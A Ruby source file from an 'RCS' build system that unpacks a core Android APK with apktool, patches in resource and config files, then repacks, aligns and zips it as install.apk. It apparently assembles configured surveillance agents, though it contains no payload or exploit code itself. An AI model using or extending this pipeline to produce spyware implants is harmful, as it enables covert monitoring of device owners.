#
#  Agent creation for android
#

# from RCS::Common
require 'rcs-common/trace'

require 'find'

module RCS
module DB

class BuildAndroid < Build

  def initialize
    super
    @platform = 'android'
  end

  def unpack
    super

    trace :debug, "Build: apktool extract: #{@tmpdir}/apk"

    apktool = path('apktool.jar')
    core = path('core')

    system "java -jar #{apktool} d #{core} #{@tmpdir}/apk" or raise("cannot unpack with apktool")

    if File.exist?(path('apk/res/raw/resources.bin'))
      @outputs << ['apk/res/raw/resources.bin', 'apk/res/raw/config.bin']
    else
      raise "unpack failed. needed file not found"
    end
  end

  def patch(params)

    trace :debug, "Build: patching: #{params}"

    # add the file to be patched to the params
    # these params will be passed to the super
    params[:core] = 'apk/res/raw/resources.bin'
    params[:config] = 'apk/res/raw/config.bin'

    # invoke the generic patch method with the new params
    super

  end

  def melt(params)
    trace :debug, "Build: melting: #{params}"

    apktool = path('apktool.jar')
    apk = path('output.apk')
    core = path('install.apk')

    File.chmod(0755, path('aapt'))
    File.chmod(0755, path('zipalign'))

    # add to the PATH the current temp dir since the utility aapt is inside it
    ENV['PATH'] += ":#{@tmpdir}"

    system("java -jar #{apktool} b #{@tmpdir}/apk #{apk}")  or raise("cannot pack with apktool")

    CrossPlatform.exec path('zipalign'), "-f 4 #{apk} #{core}" or raise("cannot align apk")

    File.delete(apk)

    # cannot use gsub! because it is a frozen tring
    ENV['PATH'] = ENV['PATH'].gsub ":#{@tmpdir}", ''

    if File.exist?(core)
      @outputs = ['install.apk']
    else
      raise "pack failed."
    end

  end


  def pack(params)
    trace :debug, "Build: pack: #{params}"

    Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
      z.file.open('install.apk', "w") { |f| f.write File.open(path('install.apk'), 'rb') {|f| f.read} }
    end

    # this is the only file we need to output after this point
    @outputs = ['output.zip']

  end

end

end #DB::
end #RCS::
